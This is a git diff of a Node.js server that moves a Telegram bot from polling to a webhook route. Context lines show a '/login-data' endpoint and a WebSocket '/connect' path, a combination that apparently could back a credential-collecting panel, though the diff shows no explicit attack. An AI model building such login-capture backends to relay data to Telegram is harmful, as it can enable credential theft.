@@ -26,8 +26,10 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server, path: '/connect' });
 
 // --- Bot Setup ---
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-
+// --- Bot Setup ---
+const bot = new TelegramBot(BOT_TOKEN, { polling: false }); // <-- שים לב ל-false
+const WEBHOOK_URL = `https://latex-v25b.onrender.com/telegram/${BOT_TOKEN}`;
+bot.setWebHook(WEBHOOK_URL);
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -119,7 +121,10 @@ app.post('/login-data', async (req, res) => {
         res.status(200).send('Login data received.');
     } catch (e) { res.status(500).send('Server error.'); }
 });
-
+app.post(`/telegram/${BOT_TOKEN}`, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
 // ================================================================= //
 // --- Telegram Bot Logic ---
 // ================================================================= //
